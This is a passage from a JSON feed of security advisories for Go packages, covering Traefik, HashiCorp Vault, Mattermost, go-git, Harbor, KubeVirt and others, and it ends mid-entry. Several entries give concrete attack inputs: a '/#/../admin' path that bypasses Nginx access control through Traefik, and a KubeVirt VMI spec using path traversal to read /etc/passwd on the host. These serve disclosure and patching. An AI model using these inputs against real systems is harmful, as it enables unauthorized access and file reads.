"https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c"}, {"type": "PACKAGE", "url": "https://github.com/lestrrat-go/jwx"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-05T23:29:26Z", "nvd_published_at": "2023-12-05T00:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v7hc-87jc-qrrr", "modified": "2023-12-06T19:19:35Z", "published": "2023-12-06T19:19:35Z", "aliases": [], "summary": "eventing-github vulnerable to denial of service caused by improper enforcement of the timeout on individual read operations", "details": "### Impact\n\nThe eventing-github cluster-local server doesn't set `ReadHeaderTimeout`\u202c\u202d which could lead do a DDoS\u202c \u202dattack, where a large group of users send requests to the server causing the server to hang\u202c \u202dfor long enough to deny it from being available to other users, also know as a Slowloris\u202c \u202dattack.\n\n### Patches\n\nFix in `v1.12.1` and `v1.11.3`\n\n### Credits\n\nThe vulnerability was reported by Ada Logics during an ongoing security audit of Knative involving Ada Logics, the Knative maintainers, OSTIF and CNCF.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "knative.dev/eventing-github"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.39.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/knative-extensions/eventing-github/security/advisories/GHSA-v7hc-87jc-qrrr"}, {"type": "WEB", "url": "https://github.com/knative-extensions/eventing-github/pull/442"}, {"type": "WEB", "url": "https://github.com/knative-extensions/eventing-github/pull/446"}, {"type": "WEB", "url": "https://github.com/knative-extensions/eventing-github/pull/447"}, {"type": "WEB", "url": "https://github.com/knative-extensions/eventing-github/commit/ea5cb8b25fc3410dde45ce2eb95454e4cfe77c40"}, {"type": "PACKAGE", "url": "https://github.com/knative-extensions/eventing-github"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-12-06T19:19:35Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-fvhj-4qfh-q2hm", "modified": "2023-12-07T23:06:09Z", "published": "2023-12-05T18:11:48Z", "aliases": ["CVE-2023-47106"], "summary": "Traefik incorrectly processes fragment in the URL, leads to Authorization Bypass", "details": "### Summary\nWhen a request is sent to Traefik with a URL fragment, Traefik automatically URL encodes and forwards the fragment to the backend server. This violates the RFC because in the origin-form the URL should only contain the absolute path and the query.\n\nWhen this is combined with another frontend proxy like Nginx, it can be used to bypass frontend proxy URI-based access control\nrestrictions. \n\n### Details\nFor example, we have this Nginx configuration:\n\n```\nlocation /admin {\n     deny all;\n     return 403;\n}\n```\nThis can be bypassed when the attacker is requesting to /#/../admin\n\nThis won\u2019t be vulnerable if the backend server follows the RFC and ignores any characters after the fragment.\n\nHowever, if Nginx is chained with another reverse proxy which automatically URL encode the character # (Traefik) the URL will become\n\n/%23/../admin\n\nAnd allow the attacker to completely bypass the Access Restriction from the Nginx Front-End proxy.\n\nHere is a diagram to summarize the attack:\n\n![image](https://user-images.githubusercontent.com/47447167/278849578-34ca0546-99b4-44c8-8fc8-8e799c1f5069.png)\n\n### PoC\n![image (1)](https://user-images.githubusercontent.com/47447167/278849597-280f2e80-f2d7-4dd9-9662-b8f488fd5ff2.png)\n\nThis is the POC docker I've set up.  It contains Nginx, Traefik proxies and a backend server running PHP.\n\nhttps://drive.google.com/file/d/1vLnA0g7N7ZKhLNmHmuJ4JJjV_J2akNMt/view?usp=sharing\n\n### Impact\nThis allows the attacker to completely bypass the Access Restriction from Front-End proxy.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.10.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.0.0-beta5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-fvhj-4qfh-q2hm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-47106"}, {"type": "WEB", "url": "https://datatracker.ietf.org/doc/html/rfc7230#section-5.3.1"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.10.6"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5"}], "database_specific": {"cwe_ids": ["CWE-177", "CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-05T18:11:48Z", "nvd_published_at": "2023-12-04T21:15:33Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6p62-6cg9-f5f5", "modified": "2023-12-12T00:50:13Z", "published": "2023-12-09T00:35:05Z", "aliases": ["CVE-2023-6337"], "summary": "Memory exhaustion in HashiCorp Vault", "details": "HashiCorp Vault and Vault Enterprise 1.12.0 and newer are vulnerable to a denial of service through memory exhaustion of the host when handling large unauthenticated and authenticated HTTP requests from a client. Vault will attempt to map the request to memory, resulting in the exhaustion of available memory on the host, which may cause Vault to crash.\n\nFixed in\u00a0Vault 1.15.4, 1.14.8, 1.13.12.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.15.0"}, {"fixed": "1.15.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.14.0"}, {"fixed": "1.14.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.13.12"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6337"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-34-vault-vulnerable-to-denial-of-service-through-memory-exhaustion-when-handling-large-http-requests/60741"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}], "database_specific": {"cwe_ids": ["CWE-770"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-12T00:50:13Z", "nvd_published_at": "2023-12-08T22:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-63cv-4pc2-4fcf", "modified": "2023-12-08T21:57:14Z", "published": "2023-12-06T09:30:17Z", "aliases": ["CVE-2023-6459"], "summary": "Mattermost Exposure of Sensitive Information to an Unauthorized Actor vulnerability", "details": "Mattermost is grouping calls in\u00a0the /metrics endpoint by id and reports that id in the response. Since this id is the channelID, the public /metrics endpoint is revealing channelIDs.\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.14"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost/server/v8"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "8.1.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-6459"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-08T21:57:14Z", "nvd_published_at": "2023-12-06T09:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mhpq-9638-x6pw", "modified": "2023-12-20T20:31:57Z", "published": "2023-12-20T20:31:57Z", "aliases": [], "summary": "Denial of service when decrypting attack controlled input in github.com/dvsekhvalnov/jose2go", "details": "An attacker controlled input of a PBES2 encrypted JWE blob can have a very large p2c value that, when decrypted, produces a denial-of-service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/dvsekhvalnov/jose2go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.1-0.20231206184617-48ba0b76bc88"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/dvsekhvalnov/jose2go/issues/31"}, {"type": "WEB", "url": "https://github.com/dvsekhvalnov/jose2go/commit/a4584e9dd7128608fedbc67892eba9697f0d5317"}, {"type": "PACKAGE", "url": "https://github.com/dvsekhvalnov/jose2go"}, {"type": "WEB", "url": "https://www.blackhat.com/us-23/briefings/schedule/#three-new-attacks-against-json-web-tokens-31695"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-20T20:31:57Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-mw99-9chc-xw7r", "modified": "2023-12-27T15:06:52Z", "published": "2023-12-27T15:06:52Z", "aliases": ["CVE-2023-49568"], "summary": "Maliciously crafted Git server replies can cause DoS on go-git clients", "details": "### Impact\nA denial of service (DoS) vulnerability was discovered in go-git versions prior to `v5.11`. This vulnerability allows an attacker to perform denial of service attacks by providing specially crafted responses from a Git server which triggers resource exhaustion in `go-git` clients. \n\nApplications using only the in-memory filesystem supported by `go-git` are not affected by this vulnerability.\nThis is a `go-git` implementation issue and does not affect the upstream `git` cli.\n\n### Patches\nUsers running versions of `go-git` from `v4` and above are recommended to upgrade to `v5.11` in order to mitigate this vulnerability.\n\n### Workarounds\nIn cases where a bump to the latest version of `go-git` is not possible, we recommend limiting its use to only trust-worthy Git servers.\n\n## Credit\nThanks to Ionut Lalu for responsibly disclosing this vulnerability to us.\n\n### References\n- [GHSA-mw99-9chc-xw7r](https://github.com/go-git/go-git/security/advisories/GHSA-mw99-9chc-xw7r)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/go-git/go-git/v5"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "4.0.0"}, {"fixed": "5.11.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/go-git/go-git/security/advisories/GHSA-mw99-9chc-xw7r"}, {"type": "PACKAGE", "url": "https://github.com/go-git/go-git"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-27T15:06:52Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-rxg9-hgq7-8pwx", "modified": "2023-12-13T21:34:15Z", "published": "2023-12-11T00:30:32Z", "aliases": ["CVE-2023-50463"], "summary": "Header spoofing in caddy-geo-ip", "details": "The caddy-geo-ip (aka GeoIP) middleware through 0.6.0 for Caddy 2, when trust_header X-Forwarded-For is used, allows attackers to spoof their source IP address via an X-Forwarded-For header, which may bypass a protection mechanism (trusted_proxy directive in reverse_proxy or IP address range restrictions).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/shift72/caddy-geo-ip"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.6.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-50463"}, {"type": "WEB", "url": "https://github.com/shift72/caddy-geo-ip/issues/4"}, {"type": "WEB", "url": "https://caddyserver.com/v2"}, {"type": "WEB", "url": "https://github.com/shift72/caddy-geo-ip/tags"}, {"type": "PACKAGE", "url": "github.com/shift72/caddy-geo-ip"}], "database_specific": {"cwe_ids": ["CWE-290"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-11T21:46:50Z", "nvd_published_at": "2023-12-10T23:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jcrr-rr6w-8c83", "modified": "2023-12-22T19:51:38Z", "published": "2023-12-22T12:31:52Z", "aliases": ["CVE-2023-49391"], "summary": "free5GC AMF denial of service vulnerability", "details": "An issue was discovered in free5GC version 3.3.0, allows remote attackers to execute arbitrary code and cause a denial of service (DoS) on AMF component via crafted NGAP message.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/free5gc/amf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-49391"}, {"type": "WEB", "url": "https://github.com/free5gc/free5gc/issues/497"}, {"type": "WEB", "url": "https://github.com/free5gc/amf/commit/6fc612c35997cf4e8be1e5c86ae2242f04b576a9"}, {"type": "PACKAGE", "url": "https://github.com/free5gc/amf"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-12-22T19:51:38Z", "nvd_published_at": "2023-12-22T11:15:07Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3m87-5598-2v4f", "modified": "2023-12-18T20:53:30Z", "published": "2023-12-13T21:26:54Z", "withdrawn": "2023-12-18T20:53:30Z", "aliases": ["CVE-2019-3826"], "summary": "Withdrawn Advisory: Prometheus XSS Vulnerability", "details": "## Withdrawn Advisory\nThis advisory has been withdrawn because the vulnerability does not apply to the Prometheus golang package. This link is maintained to preserve external references.\n\n## Original Description\nA stored, DOM based, cross-site scripting (XSS) flaw was found in Prometheus before version 2.7.1. An attacker could exploit this by convincing an authenticated user to visit a crafted URL on a Prometheus server, allowing for the execution and persistent storage of arbitrary scripts.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prometheus/prometheus"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.7.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-3826"}, {"type": "WEB", "url": "https://github.com/aquasecurity/trivy/issues/2992"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/pull/5163"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/pull/5163/commits/ea254eea5e3c9a12d6f37a25921b7259ff1c4280"}, {"type": "WEB", "url": "https://github.com/prometheus/prometheus/commit/62e591f9"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHBA-2019:0327"}, {"type": "WEB", "url": "https://advisory.checkmarx.net/advisory/CX-2019-4297"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2019-3826"}, {"type": "WEB", "url": "https://gitlab.com/gitlab-org/security-products/gemnasium-db/-/merge_requests/26608"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r48d5019bd42e0770f7e5351e420a63a41ff1f16924942442c6aff6a8@%3Ccommits.zookeeper.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/r8e3f7da12bf5750b0a02e69a78a61073a2ac950eed7451ce70a65177@%3Ccommits.zookeeper.apache.org%3E"}, {"type": "WEB", "url": "https://lists.apache.org/thread.html/rdf2a0d94c3b5b523aeff7741ae71347415276062811b687f30ea6573@%3Ccommits.zookeeper.apache.org%3E"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-12-13T21:26:54Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-p6fh-xc6r-g5hw", "modified": "2022-09-27T15:45:09Z", "published": "2022-09-27T15:45:09Z", "aliases": ["CVE-2022-39219"], "summary": "Brokercap Bifrost subject to authentication bypass when using HTTP basic authentication", "details": "Bifrost is a middleware package which can synchronize MySQL/MariaDB binlog data to other types of databases. Versions 1.8.6-release and prior are vulnerable to authentication bypass when using HTTP basic authentication. This may allow group members who only have read permissions to write requests when they are normally forbidden from doing so. Version 1.8.7-release contains a patch. There are currently no known workarounds.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/brokercap/Bifrost"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.8.7-release"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.6-release"}}], "references": [{"type": "WEB", "url": "https://github.com/brokercap/Bifrost/security/advisories/GHSA-p6fh-xc6r-g5hw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39219"}, {"type": "WEB", "url": "https://github.com/brokercap/Bifrost/issues/200"}, {"type": "PACKAGE", "url": "https://github.com/brokercap/Bifrost"}, {"type": "WEB", "url": "https://github.com/brokercap/Bifrost/releases/tag/v1.8.7-release"}], "database_specific": {"cwe_ids": ["CWE-287", "CWE-732"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-27T15:45:09Z", "nvd_published_at": "2022-09-26T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9w7j-q3xw-p9vh", "modified": "2022-09-28T14:12:31Z", "published": "2022-09-25T00:00:26Z", "aliases": ["CVE-2022-35253"], "summary": "Hyperledger Fabric subject to Denial of Service via non-validated request", "details": "A vulnerability exists in Hyperledger Fabric < 2.4 could allow an attacker to construct a non-validated request that could cause a denial of service attack.  The peer gateway service tries to extract channel and chaincode information from the signed proposal, but it doesn't check the proposal fields for validity. Therefore a malformed proposal might end up crashing the peer service. This issue has been patched in 2.4.6. There are no known workarounds.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.4.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-35253"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/3572"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/3576"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/3577"}, {"type": "PACKAGE", "url": "https://github.com/hyperledger/fabric"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-09-28T14:12:31Z", "nvd_published_at": "2022-09-23T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-3633-5h82-39pq", "modified": "2023-08-30T00:15:27Z", "published": "2022-09-16T17:17:13Z", "aliases": [], "summary": "Go-tuf Improperly handles multiple key IDs for the same public keys in attacker-controlled metadata", "details": "### Issue\n\nIf an attacker is able to control a threshold of keys to insert the same public key more than once with different key IDs into signed, trusted metadata on a TUF repository, then go-tuf [clients](https://github.com/theupdateframework/go-tuf#client) < [0.3.2](https://github.com/theupdateframework/go-tuf/releases/tag/v0.3.2) are susceptible to an attack where attackers can cause the same signature from the same public key to be counted more than once against the threshold of signatures because they were mistakenly distinguished due to having different key IDs.\n\nFor example, suppose that in the root metadata file, there were a threshold of 2 self-signatures required from 2 different keys K<sub>A</sub> and K<sub>B</sub> belonging to Alice and Bob respectively. Bob has either mistakenly or maliciously produced a signed a malicious version of the root metadata file where Alice's key is listed once with the keyid SHA2<sub>256</sub>K<sub>A</sub>, but his public key is listed twice, once with the keyid SHA2<sub>256</sub>K<sub>B</sub>, and the other with SHA2<sub>512</sub>K<sub>B</sub>. If Bob can convince Alice to mistakenly sign this root metadata file without noticing this error, then clients < 0.3.2 would mistakenly count the same signature from Bob twice, once with the keyid SHA2<sub>256</sub>K<sub>B</sub>, and the other with SHA2<sub>512</sub>K<sub>B</sub>.\n\n### Impact\n\nWhile the impact is potentially high, the severity is low as it requires either attackers or the repository (deliberately or mistakenly respectively) to have produced such an incorrect distribution of public keys, causing clients < 0.3.2 to fall prey to this issue.\n\n### Patches\n\nA fix is available for clients with versions >= [0.3.2](https://github.com/theupdateframework/go-tuf/releases/tag/v0.3.2).\n\n### Workarounds\n\nUsers can work around this vulnerability in previous clients by checking for and removing _duplicate_ public keys with different key IDs (e.g., SHA2-256 and SHA2-512 hashes of the same public key) in all signed metadata on their TUF repositories.\n\n### References\n\n* The PR fixing this issue is #369.\n* The [latest](https://theupdateframework.github.io/specification/v1.0.30/index.html#role-keyid) TUF specification advises using only SHA2-256 hashes of public keys.\n* Commit b383bafd27472310a650f3733e686163a868b71a removed support for clients generating multiple key IDs for the same public key. This commit is older than the first [v.0.1.0 tag](https://github.com/theupdateframework/go-tuf/releases/tag/v0.1.0) for go-tuf.\n* There is an outstanding [issue](https://github.com/theupdateframework/go-tuf/issues/368) for removing the non-standard `keyid_hash_algorithms` field in TUF metadata which arguably led to this issue.\n* A more robust solution is discussed (but not necessarily recommended) in [TAP 12](https://github.com/theupdateframework/taps/blob/master/tap12.md), which suggests deduplicating public keys even more strongly on the basis of the fundamental parameters (e.g., exponents) to the cryptosystem rather than specific encodings (e.g., PEM) of public keys.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [go-tuf](https://github.com/theupdateframework/go-tuf/issues)\n* Email us at TUF's [mailing list](mailto:theupdateframework@googlegroups.com)\n* The [#tuf](https://cloud-native.slack.com/archives/C8NMD3QJ3) channel on [CNCF Slack](https://slack.cncf.io/).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/theupdateframework/go-tuf"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.2"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/theupdateframework/go-tuf/security/advisories/GHSA-3633-5h82-39pq"}, {"type": "WEB", "url": "https://github.com/theupdateframework/go-tuf/pull/369"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-3633-5h82-39pq"}, {"type": "PACKAGE", "url": "https://github.com/theupdateframework/go-tuf"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1004"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-09-16T17:17:13Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jr8j-2jhp-m67v", "modified": "2022-09-16T17:17:56Z", "published": "2022-09-16T17:17:56Z", "aliases": [], "summary": "nftables binding to an already bound chain", "details": "### Impact\nAn issue was discovered in net/netfilter/nf_tables_api.c in the Linux kernel. A denial of service can occur upon binding to an already bound chain.\n\nAffected by this vulnerability is the function nft_verdict_init of the file net/netfilter/nf_tables_api.c. The manipulation with an unknown input leads to a denial of service vulnerability. The program does not release or incorrectly releases a resource before it is made available for re-use.\n\n### Patches\nThe fix has been backported to [5.15.64](https://www.linuxkernelcves.com/cves/CVE-2022-39190) version of the upstream Linux kernel (5.15 is the upstream Kernel long term version Talos ships with). Talos >= v1.2.0 is shipped with Linux Kernel 5.15.64 fixing the above issue.\n\n### Workarounds\nIt's recommended to upgrade\n\n### References\n- https://www.sesin.at/2022/09/02/cve-2022-39190-linux-kernel-up-to-5-19-5-nf_tables_api-c-nft_verdict_init-denial-of-service/\n- https://nvd.nist.gov/vuln/detail/CVE-2022-39190\n\n### For more information\n- Email us at [security@siderolabs.com](mailto:security@siderolabs.com)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/siderolabs/talos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/siderolabs/talos/security/advisories/GHSA-jr8j-2jhp-m67v"}, {"type": "PACKAGE", "url": "https://github.com/siderolabs/talos"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-16T17:17:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-8c6p-v837-77f6", "modified": "2023-04-03T19:09:32Z", "published": "2022-09-16T19:38:12Z", "aliases": ["CVE-2022-31669"], "summary": "Harbor fails to validate the user permissions when updating tag immutability policies", "details": "### Impact\nHarbor fails to validate the user permissions when updating tag immutability policies - API call:\n\n  PUT /projects/{project_name_or_id}/immutabletagrules/{immutable_rule_id}\n\nBy sending a request to update a tag immutability policy with an id that belongs to a\nproject that the currently authenticated user doesn\u2019t have access to, the attacker could\nmodify tag immutability policies configured in other projects.\n\n### Patches\nThis and similar issues are fixed in Harbor v2.5.2 and later. Please upgrade as soon as possible.\n\n### Workarounds\nThere are no workarounds available.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [the Harbor GitHub repository](https://github.com/goharbor/harbor)\n\n### Credits\nThanks to [Gal Goldstein](https://www.linkedin.com/in/gal-goldshtein/) and [Daniel Abeles](https://www.linkedin.com/in/daniel-abeles/) from [Oxeye Security](https://www.oxeye.io/) for reporting this issue.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.10.13"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.10.12"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.4.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.4.2"}}, {"package": {"ecosystem": "Go", "name": "github.com/goharbor/harbor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.2"}]}], "database_specific": {"last_known_affected_version_range": "<= 2.5.1"}}], "references": [{"type": "WEB", "url": "https://github.com/goharbor/harbor/security/advisories/GHSA-8c6p-v837-77f6"}, {"type": "PACKAGE", "url": "https://github.com/goharbor/harbor"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-16T19:38:12Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-m7w4-q5vg-5xfp", "modified": "2022-09-28T14:14:03Z", "published": "2022-09-25T00:00:21Z", "aliases": ["CVE-2022-3257"], "summary": "Mattermost subject to Denial of Service via upload of special GIF", "details": "Mattermost version 7.1.x and earlier fails to sufficiently process a specifically crafted GIF file when it is uploaded while drafting a post, which allows authenticated users to cause resource exhaustion while processing the file, resulting in server-side Denial of Service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.1.0"}, {"fixed": "7.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3257"}, {"type": "WEB", "url": "https://hackerone.com/reports/1620170"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-434"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-09-28T14:14:03Z", "nvd_published_at": "2022-09-23T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qv98-3369-g364", "modified": "2022-09-15T03:20:35Z", "published": "2022-09-15T03:20:35Z", "aliases": [], "summary": "KubeVirt vulnerable to arbitrary file read on host", "details": "### Impact\n\nUsers with the permission to create VMIs can construct VMI specs which allow them to read arbitrary files on the host. There are three main attack vectors:\n\n1. Some path fields on the VMI spec were not properly validated and allowed passing in relative paths which would have been mounted into the virt-launcher pod. The fields are: `spec.domain.firmware.kernelBoot.container.kernelPath`, `spec.domain.firmware.kernelBoot.container.initrdPath` as well as `spec.volumes[*].containerDisk.path`.\n\nExample:\n\n```yaml\napiVersion: [kubevirt.io/v1](http://kubevirt.io/v1)\nkind: VirtualMachineInstance\nmetadata:\n  name: vmi-fedora\nspec:\n  domain:\n    devices:\n      disks:\n      - disk:\n          bus: virtio\n        name: containerdisk\n      - disk:\n          bus: virtio\n        name: cloudinitdisk\n      - disk:\n          bus: virtio\n        name: containerdisk1\n      rng: {}\n    resources:\n      requests:\n        memory: 1024M\n  terminationGracePeriodSeconds: 0\n  volumes:\n  - containerDisk:\n      image: [quay.io/kubevirt/cirros-container-disk-demo:v0.52.0](http://quay.io/kubevirt/cirros-container-disk-demo:v0.52.0)\n    name: containerdisk\n  - containerDisk:\n      image: [quay.io/kubevirt/cirros-container-disk-demo:v0.52.0](http://quay.io/kubevirt/cirros-container-disk-demo:v0.52.0)\n      path: test3/../../../../../../../../etc/passwd\n    name: containerdisk1\n  - cloudInitNoCloud:\n      userData: |\n        #!/bin/sh\n        echo 'just something to make cirros happy'\n    name: cloudinitdisk\n```\n\n2. Instead of passing in relative 